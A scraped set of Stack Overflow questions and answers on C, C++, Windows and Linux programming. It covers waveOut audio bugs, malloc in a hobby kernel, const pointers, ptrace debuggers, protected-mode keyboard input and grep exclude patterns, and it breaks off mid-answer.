<p>While the obvious suspect would be a heap corruption somewhere else in the code, I found out that that's not the case. Furthermore, I was able to reproduce this problem using the following code (this is part of a dialog based MFC application:)</p>

<pre><code>void CwaveoutDlg::OnBnClickedButton1()
{
    WAVEFORMATEX wfx;
    wfx.nSamplesPerSec = 44100; /* sample rate */
    wfx.wBitsPerSample = 16; /* sample size */
    wfx.nChannels = 2;
    wfx.cbSize = 0; /* size of _extra_ info */
    wfx.wFormatTag = WAVE_FORMAT_PCM;
    wfx.nBlockAlign = (wfx.wBitsPerSample &gt;&gt; 3) * wfx.nChannels;
    wfx.nAvgBytesPerSec = wfx.nBlockAlign * wfx.nSamplesPerSec;

    waveOutOpen(&amp;hWaveOut, 
                WAVE_MAPPER, 
                &amp;wfx,  
                (DWORD_PTR)m_hWnd, 
                0,
                CALLBACK_WINDOW );

    ZeroMemory(&amp;header, sizeof(header));
    header.dwBufferLength = 4608;
    header.lpData = (LPSTR)GlobalLock(GlobalAlloc(GMEM_MOVEABLE | GMEM_SHARE | GMEM_ZEROINIT, 4608));

    waveOutPrepareHeader(hWaveOut, &amp;header, sizeof(header));
    waveOutWrite(hWaveOut, &amp;header, sizeof(header));
}

afx_msg LRESULT CwaveoutDlg::OnWOMDone(WPARAM wParam, LPARAM lParam)
{
    HWAVEOUT dev = (HWAVEOUT)wParam;
    WAVEHDR *hdr = (WAVEHDR*)lParam;
    waveOutUnprepareHeader(dev, hdr, sizeof(WAVEHDR));
    GlobalFree(GlobalHandle(hdr-&gt;lpData));
    ZeroMemory(hdr, sizeof(*hdr));
    hdr-&gt;dwBufferLength = 4608;
    hdr-&gt;lpData = (LPSTR)GlobalLock(GlobalAlloc(GMEM_MOVEABLE | GMEM_SHARE | GMEM_ZEROINIT, 4608));
    waveOutPrepareHeader(hWaveOut, &amp;header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, hdr, sizeof(WAVEHDR));
    return 0;
 }
</code></pre>

<p>Before anyone comments on this, yes - the sample code plays back uninitialized memory. Don't try this with your speakers turned all the way up.</p>

<p>Some debugging revealed the following information: waveOutPrepareHeader() populates header.reserved with a pointer to what appears to be a structure containing at least two pointers as its first two members. The first pointer is set to NULL. After calling waveOutWrite(), this pointer is set to a pointer allocated on the global heap. In pseudo code, that would look something like this:</p>

<pre><code>struct Undocumented { void *p1, *p2; } /* This might have more members */

MMRESULT waveOutPrepareHeader( handle, LPWAVEHDR hdr, ...) {
    hdr-&gt;reserved = (Undocumented*)calloc(sizeof(Undocumented));
    /* Do more stuff... */
}

MMRESULT waveOutWrite( handle, LPWAVEHDR hdr, ...) {

    /* The following assignment fails rarely, causing the problem: */
    hdr-&gt;reserved-&gt;p1 = malloc( /* chunk of private data */ );
    /* Probably more code to initiate playback */
}
</code></pre>

<p>Normally, the header is returned to the application by waveCompleteHeader(), a function internal to wdmaud.dll. waveCompleteHeader() tries to deallocate the pointer allocated by waveOutWrite() by calling GlobalHandle()/GlobalUnlock() and friends. Sometimes, GlobalHandle() bombs, as shown above.</p>

<p>Now, the reason that GlobalHandle() bombs is not due to a heap corruption, as I suspected at first - it's because waveOutWrite() returned without setting the first pointer in the internal structure to a valid pointer. I suspect that it frees the memory pointed to by that pointer before returning, but I haven't disassembled it yet.</p>

<p>This only appears to happen when the wave playback system is low on buffers, which is why I'm using a single header to reproduce this.</p>

<p>At this point I have a pretty good case against this being a bug in my application - after all, my application is not even running. Has anyone seen this before?</p>

<p>I'm seeing this on Windows XP SP2. The audio card is from SigmaTel, and the driver version is 5.10.0.4995.</p>

<p>Notes:</p>

<p>To prevent confusion in the future, I'd like to point out that the answer suggesting that the problem lies with the use of malloc()/free() to manage the buffers being played is simply wrong. You'll note that I changed the code above to reflect the suggestion, to prevent more people from making the same mistake - it doesn't make a difference. The buffer being freed by waveCompleteHeader() is not the one containing the PCM data, the responsibility to free the PCM buffer lies with the application, and there's no requirement that it be allocated in any specific way.</p>

<p>Also, I make sure that none of the waveOut API calls I use fail.</p>

<p>I'm currently assuming that this is either a bug in Windows, or in the audio driver. Dissenting opinions are always welcome.</p>
","9530","Adam Rosenfield","<p>It may be helpful to look at the <a href=""http://winehq.org/download/#source"" rel=""nofollow"">source code for Wine</a>, although it's possible that Wine has fixed whatever bug there is, and it's also possible Wine has other bugs in it.  The relevant files are dlls/winmm/winmm.c, dlls/winmm/lolvldrv.c, and possibly others.  Good luck!</p>
"
"<p>I'm working on designing the kernel (which I'm going to actually call the ""core"" just to be different, but its basically the same) for an OS I'm working on. The specifics of the OS itself are irrelevant if I can't get multi-tasking, memory management, and other basic things up and running, so I need to work on that first. I've some questinos about designing a malloc routine.</p>

<p>I figure that malloc() is either going to be a part of the kernel itself (I'm leaning towards this) or a part of the program, but I'm going to have to write my own implementation of the C standard library either way, so I get to write a malloc. My question is actually rather simple in this regard, how does C (or C++) manage its heap?</p>

<p>What I've always been taught in theorey classes is that the heap is an ever expanding piece of memory, starting at a specified address, and in a lot of senses behaving like a stack. In this way, I know that variables declared in global scope are at the beginning, and more variables are ""pushed"" onto the heap as they are declared in their respective scopes, and variables that go out of scope are simply left in memory space, but that space is marked as free so the heap can expand more if it needs to.</p>

<p>What I need to know is, how on earth does C actually handle a dynamically expanding heap in this manner? Does a compiled C program make its own calls to a malloc routine and handle its own heap, or do I need to provide it with an automatically expanding space? Also, how does the C program know where the heap begins?</p>

<p>Oh, and I know that the same concepts apply to other languages, but I would like any examples to be in C/C++ because I'm most comfortable with that language. I also would like to not worry about other things such as the stack, as I think I'm able to handle things like this on my own.</p>

<p>So I suppose my real question is, other than malloc/free (which handles getting and freeing pages for itself, etc) does a program need the OS to provide anything else?</p>

<p>Thanks!</p>

<p><em>EDIT</em> I'm more interested in how C uses malloc in relation with the heap than in the actual workings of the malloc routine itself. If it helps, I'm doing this on x86, but C is cross compiler so it shouldn't matter. ^_^</p>

<p>EDIT FURTHER: I understand that I may be getting terms confused. I was taught that the ""heap"" was where the program stored things like global/local variables. I'm used to dealing with a ""stack"" in assembly programming, and I just realized that I probably mean that instead. A little research on my part shows that ""heap"" is more commonly used to refer to the total memory that a program has allocated for itself, or, the total number (and order) of pages of memory the OS has provided.</p>

<p>So, with that in mind, how do I deal with an ever expanding <em>stack</em>? (it does appear that my C theory class was mildly... flawed.)</p>
","9530","Adam Rosenfield","<p><code>malloc</code> is generally implemented in the C runtime in userspace, relying on specific OS system calls to map in pages of virtual memory.  The job of <code>malloc</code> and <code>free</code> is to manage those pages of memory, which are fixed in size (typically 4 KB, but sometimes bigger), and to slice and dice them into pieces that applications can use.</p>

<p>See, for example, the <a href=""http://www.gnu.org/software/libc/"">GNU libc</a> implementation.</p>

<p>For a much simpler implementation, check out the <a href=""http://pdos.csail.mit.edu/6.828/2007/"">MIT operating systems</a> class from last year.  Specifically, see the <a href=""http://pdos.lcs.mit.edu/6.828/2007/labs/lab6/lab6-handout.tar.gz"">final lab handout</a>, and take a look at <code>lib/malloc.c</code>.  This code uses the operating system JOS developed in the class.  The way it works is that it reads through the page tables (provided read-only by the OS), looking for unmapped virtual address ranges.  It then uses the <code>sys_page_alloc</code> and <code>sys_page_unmap</code> system calls to map and unmap pages into the current process.</p>
"
"<p>I'm looking for a way to match only fully composed characters in a Unicode string.</p>

<p>Is <code>[:print:]</code> dependent upon locale in any regular expression implementation that incorporates this character class? For example, will it match Japanese character 'あ', since it is not a control character, or is <code>[:print:]</code> always going to be ASCII codes 0x20 to 0x7E?</p>

<p>Is there any character class, including Perl REs, that can be used to match anything other than a control character? If <code>[:print:]</code> includes only characters in ASCII range I would assume <code>[:cntrl:]</code> does too.</p>
","9530","Adam Rosenfield","<p>You could always use the character class <code>[^[:cntrl:]]</code> to match non-control characters.</p>
"
"<p>I want to do sparse high dimensional (a few thousand features) least squares regression with a few hundred thousands of examples. I'm happy to use non fancy optimisation - stochastic gradient descent is fine.</p>

<p>Does anyone know of any software already implemented for doing this, so I don't have to write to my own?</p>

<p>Kind regards.</p>
","9530","Adam Rosenfield","<p>I'd suggest taking a look at <a href=""http://www.netlib.org/lapack/"" rel=""nofollow"">LAPACK</a>.  It's a pretty mature linear algebra library, although interfacing with it can be a little tricky, since it's written in Fortran.  That's fine, though, since Fortran is ABI compatible with C, if you get your function prototypes right.</p>

<p>[Edit] Upon further review, it appears that LAPACK does not support sparse matrices.  It can handle banded matrices for some purposes, but for the linear least-squares problem, it only supports general matrices.</p>
"
"<p>After some find and replace refactoring I ended up with this gem:</p>

<pre><code>const class A
{
};
</code></pre>

<p>What does ""const class"" mean? It seems to compile ok.</p>
","9530","Adam Rosenfield","<p>The <code>const</code> is meaningless in that example, and your compiler should give you an error, but if you use it to declare variables of that class between the closing <code>}</code> and the <code>;</code>, then that defines those instances as <code>const</code>, e.g.:</p>

<pre><code>
const class A
{
public:
    int x, y;
}  anInstance = {3, 4};

// The above is equivalent to:
const A anInstance = {3, 4};
</code></pre>
"
"<p>I'm writing a C/C++ application under Linux that reads data from a raw socket (for ICMP packets). Question: is there a way to discard all data that is still queued on the socket?</p>

<p>The problem is that after sleeping for a while, there is data queued up on the socket which I'm not interested in; so it would be best to just tell the socket ""forget all data you have buffered right now"", so that if I go into a select()/recvfrom() loop then, I only get data that was received recently.</p>

<p>Is there a better way than going into a separate poll()/recvfrom() loop first? Some socket API call maybe? Portable, even? :-)</p>
","9530","Adam Rosenfield","<p>Can't you just do a <code>recvfrom()</code> into a temporary buffer and discard the buffer?</p>
"
"<p>If I have a VB.Net function that returns an Int32, but uses an unsigned int (UInt32) for calculations, etc.  How can I convert a variable ""MyUintVar32"" with a value of say ""3392918397 into a standard Int32 in VB.Net?  </p>

<p>In c# if I just do a ""return (int)(MyUintVar32);"", I get -902048899, not an error.</p>

<p>I've tried several different methods.  What is the difference in the way c# handles these conversions versus VB.Net?</p>
","9530","Adam Rosenfield","<p>You can't convert 3392918397 into an Int32 since that number is too large to fit in 31 bits.  Why not just change the function to return a UInt32?</p>
"
"<p>I have G729 encoded audio files. I need to programmatically convert them to WAV PCM (16bit 8kHz mono) in the flow of a tool that is doing other thing too. I have an executable that will do that for me. But spawning that external process every time I convert is too heavy on resources. Especially if I need many of them being done in parallel.
Looking for a .NET library or code that will let me call this inside my process.</p>
","9530","Adam Rosenfield","<p>According to Wikipedia, G.729 includes several patents and is licensed by <a href=""http://www.spiro.com"" rel=""nofollow"">Sipra</a>, so you probably won't have much luck finding an appropriate lobrary.  Unless you're decoding a large number of very small files, the cost of spawning a new process shouldn't be that big compared to the cost of doing the decoding, so I'd say use the executable you have.</p>

<p>As far as resources go, yes, spawning processes requires a lot more resources compared to using threads.  This shouldn't really matter, though, so long as you only spawn as many processes as you have cores in your machine.  Spawning more processes just wastes resources and doesn't gain you any extra parallelism.</p>
"
"<p>I tried ""x = y ** e"", but that didn't work.</p>
","9530","Adam Rosenfield","<p>To add to what <a href=""http://stackoverflow.com/questions/213042/how-do-you-do-exponentiation-in-c#213043"">Evan</a> said: C does not have a built-in operator for exponentiation, because it is not a primitive operation for most CPUs.  Thus, it's implemented as a library function.</p>

<p>Also, for computing the function e^x, you can use the <code>exp(double)</code>, <code>expf(float)</code>, and <code>expl(long double)</code> functions.</p>

<p>Note that you do <strong>not</strong> want to use the <code>^</code> operator, which is the <em>bitwise exclusive OR</em> operator.</p>
"
"<p>using the Symbian S60 5th edition SDK released on October 2nd, I am compiling/running(on sim) the following code snippet:</p>

<pre><code>void test(wchar_t *dest, int size, const wchar_t *fmt, ...) {
    va_list vl;
    va_start(vl, fmt);
    vswprintf(dest, size, fmt, vl);
    va_end(vl);
}

...

wchar_t str[1024];

// this crashes (2nd string 123 characters (+ \0) equals 248 bytes)
test(str, 1024, L""msg: %S"", L""this is a test messagethis is a test messagethis is a test messagethis is a test messagethis is a test messagethis is a tes"");

// this works (2nd string 122 characters (+ \0) equals 246 bytes)
test(str, 1024, L""msg: %S"", L""this is a test messagethis is a test messagethis is a test messagethis is a test messagethis is a test messagethis is a te"");
</code></pre>

<p>For no reason obvious to me (even after having read the <a href=""http://www.forum.nokia.com/document/CDL_Extension_S60_3rd_Ed_FP2/GUID-719955DA-415B-420E-9F9B-F6DB37615EC5/html/wprintf.html"" rel=""nofollow"">vswprintf</a> man page a hundred times) can I figure out why this code is crashing on me in the vswprintf call for long strings :-( The exact same code works fine on a Linux box. There is sufficient memory allocated for str, plus vswprintf is checking for buffer overruns anyway. Unfortunately the ... S60 debugger does not break on this crash, so I have no details :-(</p>

<p>Does anybody have any ideas? </p>

<p>Assuming a bug in Symbian's vswprintf routine, what would be possible replacement functions using POSIX compliant code? (this is supposed to be a cross-platform library)</p>

<p>Thanks.</p>
","9530","Adam Rosenfield","<p>You could try changing the <code>%S</code> format specifier to <code>%ls</code>.  As mentioned in my earlier comment, they're supposed to be equivalent, but there could be a bug in the implementation.  Note that the <code>vswprintf</code> function is defined in the C99 standard, and since there are not yet any fully conforming C99 compilers (I believe), it's very possible that any given implementation of <code>vswprintf</code> does not fully conform to the spec, or that it contains bugs (the former is more likely than the latter).</p>
"
"<p>I was getting bad data from an application I was writting using C++ in Visual Studio 2k3 so I decided to debug it. Then I found it was throwing an exception but one I can't track down.</p>

<p>Then I placed some try/catch blocks and low and behold, when I don't debug there is no exception. That is, I have code that looks like this:</p>

<p><code><pre>
std::vector&lt;MyClass*&gt; ListOfStuff;
.
.
.
try
{
.
.
.
   const MyClass * localPointer = ListOfStuff[i]; //This is where the exception occurs
.
.
}
 catch (...)
{
   int x = 0;  //place break here
}
</pre></code>
So if I step through the code line by line I'll get an exception and shot to the catch. But if I just let it run with a breakpoint inside the catch nothing happens. Using an iterator has the same behavior. And I can successfully check the size of the vector so I know I'm within the bounds.
<br>
Can anyone tell me what's going on? If it matters I'm using some standard windows libraries and openGL.</p>
","9530","Adam Rosenfield","<p>Is that code part of a class method, and is <code>ListOfStuff</code> a member of the class?  If so, check to make sure that your <code>this</code> pointer is valid.</p>
"
"<p>I would like to embed Flash Player directly inside a C++ or Java application.</p>

<p>I found an article that describes how to do this for C#:
<a href=""http://www.adobe.com/devnet/flash/articles/stock_history03.html"" rel=""nofollow"">http://www.adobe.com/devnet/flash/articles/stock_history03.html</a></p>

<p>Unfortunately, I have no experience with C#, COM or ActiveX. I need someone to translate this code to C++, allowing me to embed the Flash Player into a Win32 Window. Ultimately I'd like to use this information to embed Flash into a Java application.</p>

<p>I am looking for three main functionalities:</p>

<ol>
<li>Ability to play a Flash movie</li>
<li>Ability to receive events (such as mouse clicks)</li>
<li>Ability to send events</li>
</ol>

<p>Edit: I prefer an open-source solution if possible.</p>
","9530","Adam Rosenfield","<p>If you want to go with a commercial solution, I'd recommend <a href=""https://www.scaleform.com/products_gfx.php"" rel=""nofollow"">Scaleform GFx</a>.  It's not cheap, though, but it's damn good.</p>
"
"<p>On the Python side, I can create new numpy record arrays as follows:</p>

<pre><code>numpy.zeros((3,), dtype=[('a', 'i4'), ('b', 'U5')])
</code></pre>

<p>How do I do the same from a C program?  I suppose I have to call <code>PyArray_SimpleNewFromDescr(nd, dims, descr)</code>, but how do I construct a <code>PyArray_Descr</code> that is appropriate for passing as the third argument to <code>PyArray_SimpleNewFromDescr</code>?</p>
","9530","Adam Rosenfield","<p>See the <a href=""http://csc.ucdavis.edu/~chaos/courses/nlp/Software/NumPyBook.pdf"" rel=""nofollow"">Guide to NumPy</a>, section 13.3.10.  There's lots of different ways to make a descriptor, although it's not nearly as easy as writing <code>[('a', 'i4'), ('b', 'U5')]</code>.</p>
"
"<p>What are the pros and cons of using nested public C++ classes and enumerations?  For example, suppose you have a class called <code>printer</code>, and this class also stores information on output trays, you could have:</p>

<pre><code>class printer
{
public:
    std::string name_;

    enum TYPE
    {
        TYPE_LOCAL,
        TYPE_NETWORK,
    };

    class output_tray
    {
        ...
    };
    ...
};

printer prn;
printer::TYPE type;
printer::output_tray tray;
</code></pre>

<p>Alternatively:</p>

<pre><code>class printer
{
public:
    std::string name_;
    ...
};

enum PRINTER_TYPE
{
    PRINTER_TYPE_LOCAL,
    PRINTER_TYPE_NETWORK,
};

class output_tray
{
    ...
};

printer prn;
PRINTER_TYPE type;
output_tray tray;
</code></pre>

<p>I can see the benefits of nesting private enums/classes, but when it comes to public ones, the office is split - it seems to be more of a style choice.</p>

<p>So, which do you prefer and why?</p>
","9530","Adam Rosenfield","<p>One con that can become a big deal for large projects is that it is impossible to make a forward declaration for nested classes or enums.</p>
"
"<p>I keep wondering how does a debugger work? Particulary the one that can be 'attached' to already running executable. I understand that compiler translates code to machine language, but then how does debugger 'know' what it is being attached to?</p>
","9530","Adam Rosenfield","<p>In Linux, debugging a process begins with the <a href=""http://linux.die.net/man/2/ptrace"">ptrace(2)</a> system call.  <a href=""http://www.linuxjournal.com/article/6100"">This article</a> has a great tutorial on how to use <code>ptrace</code> to implement some simple debugging constructs.</p>
"
"<p>I'm wondering about the practical use of #undef in C. I'm working through K&amp;R, and am up to the preprocessor. Most of this was material I (more or less) understood, but something on page 90 (second edition) stuck out at me:</p>

<blockquote>
  <p>Names may be undefined with <code>#undef</code>,
  usually to ensure that a routine is
  really a function, not a macro:</p>
  
  <p><code>#undef getchar</code></p>
  
  <p><code>int getchar(void) { ... }</code></p>
</blockquote>

<p>Is this a common practice to defend against someone <code>#define</code>-ing a macro with the same name as your function? Or is this really more of a sample that wouldn't occur in reality? (EG, no one in his right, wrong nor insane mind should be rewriting <code>getchar()</code>, so it shouldn't come up.) With your own function names, do you feel the need to do this? Does that change if you're developing a library for others to use?</p>
","9530","Adam Rosenfield","<p>Because preprocessor <code>#define</code>s are all in one global namespace, it's easy for namespace conflicts to result, especially when using third-party libraries.  For example, if you wanted to create a function named <code>OpenFile</code>, it might not compile correctly, because the header file <code>&lt;windows.h&gt;</code> defines the token <code>OpenFile</code> to map to either <code>OpenFileA</code> or <code>OpenFileW</code> (depending on if <code>UNICODE</code> is defined or not).  The correct solution is to <code>#undef</code> <code>OpenFile</code> before defining your function.</p>
"
"<p>What are the “normal” ways to do plug-ins in compiled languages (C#/C/C++/D)? I am specifically interested in language agnostic approaches but language specific is not unacceptable.</p>

<p>For the time being, “compile time” plug in approaches (just include the code or not and everything works) are valid but things that can migrate to a more dynamic approach are preferred.</p>

<p>Regarding the runtime type, I'm more interested in the mechanics of loading the plug-in and whatnot than designing the plug-in/app interface </p>

<p>EDIT: BTW the plugin would be a slave not a master. The basic action of a plug-in would be to that under a given situation, it would be called on to ""do its thing"" and be given an environment object that it should use to get what it needs to operate.</p>
","9530","Adam Rosenfield","<p>For compiled languages (where compiled means the program runs as a native executable, without any sort of virtual machine), you pretty much need to use some sort of platform-specific shared library approach.  In Windows, this means using DLLs.</p>

<p>You define your plugin interface in terms of a set of functions (with specific names, arguments, and calling conventions).  Then, you load the addresses of the functions within the shared library and go to town.  In Windows, this means using <a href=""http://msdn.microsoft.com/en-us/library/ms683212(VS.85).aspx"" rel=""nofollow"">GetProcAddress()</a>, and then casting the return value to a function pointer of the appropriate type in C, or whatever the equivalent is in the language you're using.</p>

<p>Another option that may or may not be more desirable would be to run a virtual machine for another language from within your native application, and have plugins be code for that language.  For example, you could run a Python VM using CPython and dynamically load Python modules.</p>
"
"<p>I'm attempting to display some text in my program using (say) Windows GDI and some of the unicode characters are displayed as question marks? What is up?</p>

<p>See also: <a href=""http://stackoverflow.com/questions/217228/what-does-it-mean-when-my-text-is-displayed-as-boxes"">What does it mean when my text is displayed as boxes?</a></p>
","9530","Adam Rosenfield","<p>It means your Unicode text is getting converted to ANSI text somewhere.  Since Unicode characters outside of Latin-1 can't be converted to ANSI, they are converted to question marks.  Make sure that your program is compiled with Unicode support on (i.e. the preprocessor symbols UNICODE and _UNICODE are #defined by your project), so that you're always calling the proper Unicode versions of the various Windows functions.</p>
"
"<p>I'm a c++ programmer and I'm playing around with java after finding JPA which for a few of my current applications is a god send. I haven't touched java since university and I'm having a problem running out of heap space. I'm using the code below as the main part of a not-very-serious test of jdbc/jpa/lucene but I keep on getting random OutOfMemory exceptions.</p>

<pre><code>        EntityManager em = emf.createEntityManager();
        Query q = em.createQuery(""select p from Product p"" +
            "" where p.productid = :productid"");
        Connection con = DriverManager.getConnection(""connection string"");
        Statement st = con.createStatement();

        IndexWriter writer = new IndexWriter(""c:\\temp\\lucene"", new StandardAnalyzer(), IndexWriter.MaxFieldLength.LIMITED);

        ResultSet rs = st.executeQuery(""select productid from product order by productid"");
        while (rs.next()) {
            int productid = rs.getInt(""PRODUCTID"");
            q.setParameter(""productid"", productid);
            Product p = (Product)q.getSingleResult();

            writer.addDocument(createDocument(p));
        }

        writer.commit();
        writer.optimize();
        writer.close();

        st.close();
        con.close();
</code></pre>

<p>I won't post all of createDocument but all it does is instantiate a new org.apache.lucene.document.Document and adds fields via add(new Field...) etc. There are about 50 fields in total and most are short strings (&lt;32 characters) in length.</p>

<p>In my newby-ness is there something completely stupid I'm doing (or not) that would cause things not to be GC'd?</p>

<p>Are there best practices reagrding java memory management and tickling the GC?</p>
","9530","Adam Rosenfield","<p>I don't see anything obviously out of place.  If you're working with a very large database, you could try increasing your heap size by using the <code>-Xmx n</code> option in your JVM invocation.  This is usually not the best solution - only do with this when you know your working set size is actually bigger than the default heap size.</p>

<p>Are you using any complex data structures?  If you have circular references between objects, you might be preventing the garbage collector from cleaning up unreachable objects.  If you have any hand-written data structures, make sure that you explicitly null out references to objects that are removed instead of doing something like decrementing a size variable.</p>
"
"<p>I have a problem with Visual C++ 2008. I have installed opencv and I've created a new program and I build it with no errors. However, it complains about not finding MSVCR90D.dll when debugging. In release mode there is no problem at all. </p>

<p>I do have MSVCR90D.dll in one of Winsxs folders. Does anyone know a get-around to this problem? Is this a known bug? </p>

<p>Gerard</p>
","9530","","<p>I can't give a definitive solution, but here are some helpful links:</p>

<ul>
<li><a href=""http://davidlenihan.com/2007/07/winsxs.html"" rel=""nofollow"">David Lenihan's blog on WinSxS</a></li>
<li><a href=""http://msdn.microsoft.com/en-us/library/aa376307%28VS.85%29.aspx"" rel=""nofollow"">Side-by-side assemblies</a></li>
<li><a href=""http://msdn.microsoft.com/en-us/library/ms235342%28VS.80%29.aspx"" rel=""nofollow"">Troubleshooting C/C++ Isolated Applications and Side-by-side Assemblies</a></li>
<li><a href=""http://msdn.microsoft.com/en-us/library/aa374224%28VS.85%29.aspx"" rel=""nofollow"">Assembly Searching Sequence</a></li>
</ul>

<p>And of course, there's a lot more on MSDN if you follow the links.</p>
"
"<p>So I'm working on keyboard input for a very bare bones kernel that I'm throwing together, and I'm completely stuck. I can't seem to find <em>any</em> information online that can tell me the information I need to know.</p>

<p>My kernel is running in protected mode right now, so I can't use the ""normal"" real mode keyboard routines without jumping into real mode and back, which I'm trying to avoid. So basically, I want to access my keyboard from protected mode. Does anyone know how to do this?  The only thing I have found so far is that it involves talking to the controller directly using in/out ports, but beyond that I'm stumped. This is, of course, not something that comes up very often as usually asm tutorials assume you're running an OS underneath...</p>

<p>I'm very new to x86 assembly, so really I'm just looking for some good resources for working with the standard hardware from protected mode. I think I'll be good if I can get that going. </p>

<p>Oh, if you're going to post code examples, I'm compiling the assembly bits with NASM, and linking it to C bits compiled with DJGPP if it matters.</p>

<p>Thanks</p>
","9530","Adam Rosenfield","<p>The <a href=""http://course.mit.edu/6.828"">MIT operating systems class</a> has lots of good references.  In particular, check out <a href=""http://www.computer-engineering.org/index.html"">Adam Chapweske's resources</a> on keyboard and mouse programming.</p>

<p>In short, yes, you will be using the raw in/out ports, which requires either running in kernel mode, or having the I/O permission bits (IOPL) set in the EFLAGS register.  See <a href=""http://pdos.csail.mit.edu/6.828/2008/readings/i386/s08_03.htm"">this page</a> for more details on I/O permissions.</p>
"
"<p>I have a file containing 250 million website URLs, each with an IP address, page title, country name, server banner (e.g. ""Apache""), response time (in ms), number of images and so on. At the moment, these records are in a 25gb flat file.</p>

<p>I'm interested in generating various statistics from this file, such as:</p>

<ul>
<li>number of IP addresses represented per country</li>
<li>average response time per country</li>
<li>number of images v response time</li>
</ul>

<p>etc etc.</p>

<p>My question is, how would you achieve this type and scale of processing, and what platform and tools wuld you use(in a reasonable time)?</p>

<p>I am open to all suggestions, from MS SQL on Windows to Ruby on Solaris, all suggestions :-) Bonus points for DRY (don't repeat yourself), I'd prefer not to write a new program each time a different cut is required.</p>

<p>Any comments on what works, and what's to be avoided would greatly be appreciated.</p>
","9530","Adam Rosenfield","<p>If you have more than one computer at your disposal, this is a perfect job for <a href=""http://en.wikipedia.org/wiki/MapReduce"" rel=""nofollow"">MapReduce</a>.</p>
"
"<p>In Visual Studio, I often use objects only for RAII purposes.  For example:</p>

<pre><code>ScopeGuard close_guard = MakeGuard( &amp;close_file, file );
</code></pre>

<p>The whole purpose of *close_guard* is to make sure that the file will be close on function exit, it is not used anywhere else.  However, Visual Studio gives me a warning that a ""<em>local variable is initialized but not referenced</em>"".  I want to turn this warning off for this specific case.</p>

<p>How do you deal with this kind of situation?  Visual Studio thinks that this object is useless, but this is wrong since it has a non-trivial destructor.</p>

<p>I wouldn't want to use a <em>#pragma warning</em> directive for this since it would turn off this warning even for legitimate reasons.</p>
","9530","Adam Rosenfield","<p>If your object has a non-trivial destructor, Visual Studio should <em>not</em> be giving you that warning.  The following code does not generate any warnings in VS2005 with warnings turned all the way up (/W4):</p>

<pre><code>
class Test
{
public:
    ~Test(void) { printf(""destructor\n""); }
};

Test foo(void) { return Test(); }

int main(void)
{
    Test t = foo();
    printf(""moo\n"");

    return 0;
}
</code></pre>

<p>Commenting out the destructor gives a warning; the code as-is does not.</p>
"
"<p>I've often used pointers to const objects, like so...</p>

<pre><code>const int *p;
</code></pre>

<p>That simply means that you can't change the integer that <code>p</code> is pointing at through <code>p</code>. But I've also seen reference to const pointers, declared like this...</p>

<pre><code>int* const p;
</code></pre>

<p>As I understand it, that means that the pointer variable <em>itself</em> is constant -- you can change the integer it points at all day long, but you can't make it point at something else.</p>

<p>What possible use would that have?</p>
","9530","Adam Rosenfield","<p>In any non-const C++ member function, the <code>this</code> pointer is of type <code>C * const</code>, where <code>C</code> is the class type -- you can change what it points to (i.e. its members), but you can't change it to point to a different instance of a <code>C</code>.  For <code>const</code> member functions, <code>this</code> is of type <code>const C * const</code>.  There are also (rarely encountered) <code>volatile</code> and <code>const volatile</code> member functions, for which <code>this</code> also has the <code>volatile</code> qualifier.</p>
"
"<p>Inspired by <a href=""http://stackoverflow.com/questions/220044/which-sort-algorithm-works-best-on-mostly-sorted-data"">this question</a></p>

<p>The choice of which algorithm to use to sort a collection can be made better if we know ahead of time how well sorted a collection is. Is there a way we can measure (or maintain a measurement) of how well sorted the collection is? Can we do this in such a way that the cost of maintaining or measuring how well sorted something doesn't outweigh the benefit of choosing the best sort algorithm?</p>
","9530","Adam Rosenfield","<p>If you don't know anything <em>a priori</em> about the collection, any time spent trying to instrument its sortedness will be far greater than the savings you would get by picking the optimal sorting algorithm.</p>

<p>If, on the other hand, you're going to be sorting many data sets that all have similar amounts of sortedness, you can measure the first dataset, pick an algorithm, and then use that one for all subsequent data sets.</p>
"
"<p>What is the memory model for concurrency in C++03?</p>

<p>(And, does C++11 change the memory model to support concurrency better?)</p>
","9530","Adam Rosenfield","<p>Short answer: there is none</p>

<p>Long answer: C++ does not have managed memory, you have to allocate it and free it yourself.  Smart pointer classes can make this less burdensome.  If you forget to free memory that you allocated, that's a memory leak and a bug.  If you try to use memory after freeing it, or you try to free memory more than once, those are also nasty bugs.</p>

<p>As for the low-level details, C++ does not specify that - it's up to the hardware.  Memory is accessed through pointers, which contain some sort of memory address.  Memory addresses can either be physical addresses or virtual addresses.  You'll only see physical addresses if you're working on an operating system kernel, or if you're reading old DOS code that ran in real mode.  For more details, read up <a href=""http://en.wikipedia.org/wiki/Virtual_memory"" rel=""nofollow"">virtual memory</a>, there's lots of good resources out there.</p>

<p>The x86 architecture also allows memory to be addressed using segment descriptors.  This is a whole nother can of worms, which hasn't really been used since the days of Win16, and if you're lucky, you'll never have to deal with it.</p>
"
"<p>how can i detect keyboard event in c language without using third party libraries? Should I use signal handling?</p>
","9530","Adam Rosenfield","<p>You really should use third party libraries.  There's definitely no platform-independent way to do it in ANSI C.  Signal handling is not the way.</p>
"
"<p>I'm looking for the string ""foo="" (without quotes) in text files in a directory tree. It's on a common Linux machine, I have bash shell:</p>

<pre><code>grep -ircl ""foo="" *
</code></pre>

<p>In the directories are also many binary files which match ""foo="". As these results are not relevant and slow down the search, I want grep to skip searching these files (mostly JPEG and PNG images). How would I do that?</p>

<p>I know there are the --exclude=PATTERN and --include=PATTERN options, but what is the pattern format? The man page of grep says:</p>

<pre><code>--include=PATTERN     Recurse in directories only searching file matching PATTERN.
--exclude=PATTERN     Recurse in directories skip file matching PATTERN.
</code></pre>

<p>Searching on <em>grep include</em>, <em>grep include exclude</em>, <em>grep exclude</em> and variants did not find anything relevant</p>

<p>If there's a better way of grepping only in certain files, I'm all for it; moving the offending files is not an option. I can't search only certain directories (the directory structure is a big mess, with everything everywhere). Also, I can't install anything, so I have to do with common tools (like <em>grep</em> or the suggested <em>find</em>).</p>

<p><strong>UPDATES: <a href=""http://stackoverflow.com/questions/221921/grep-exclude-include-syntax-do-not-grep-through-certain-files#221929"">@Adam Rosenfield</a>'s answer is just what I was looking for:</strong></p>

<pre><code>grep -ircl --exclude=*.{png,jpg} ""foo="" *
</code></pre>

<p><a href=""http://stackoverflow.com/questions/221921/grep-exclude-include-syntax-do-not-grep-through-certain-files#222021"">@rmeador</a>'s answer is also a good solution:</p>

<pre><code>grep -Ir --exclude=""*\.svn*"" ""pattern"" *
</code></pre>

<blockquote>
  <p>It searches recursively, ignores binary files, and doesn't look inside Subversion hidden folders.(...)</p>
</blockquote>
","9530","Adam Rosenfield","<p>Use the shell globbing syntax:</p>

